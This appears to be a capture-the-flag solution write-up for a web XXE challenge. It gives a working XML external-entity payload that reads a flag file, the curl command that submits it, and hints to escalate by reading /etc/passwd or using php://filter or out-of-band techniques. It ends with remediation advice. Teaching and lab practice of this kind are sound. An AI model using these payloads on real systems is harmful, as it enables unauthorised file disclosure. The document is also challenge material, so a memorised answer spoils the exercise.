# i02 — Entity Crisis (LankaGov)

**Category:** Web / XXE · **Difficulty:** Intermediate · **Points:** 300 (dynamic)

## Intended solve
```sh
# The e-forms endpoint accepts an XML submission and parses it with external entities enabled.
cat > payload.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE form [
  <!ENTITY xxe SYSTEM "file:///srv/lankagov/flag.txt">
]>
<form><nic>&xxe;</nic><reason>renewal</reason></form>
XML

curl -s -X POST http://<vm-ip>:PORT/api/forms/submit \
  -H 'Content-Type: application/xml' --data-binary @payload.xml
#   -> the server echoes the parsed <nic> value back = file contents = CYPHER{...}
```
If the flag path isn't echoed directly, escalate: read `/etc/passwd` to confirm XXE, then read
the app config that names the flag file, or use `php://filter`/OOB depending on the parser.

## Infra & safety
- Per-team instance. XML parser configured with DTD + external entities on (the intended bug).
  Local file read is confined to the container; the flag file is the only sensitive target.
- No SSRF pivot to the metadata server from this one (egress blocked) — this is a file-read XXE.

## Remediation (Blue Team Brief)
Disable DOCTYPE/external entities in the parser (`disallow-doctype-decl`, no network/entity
expansion); prefer JSON; if XML is required, use a hardened parser configuration and validate
against a schema.
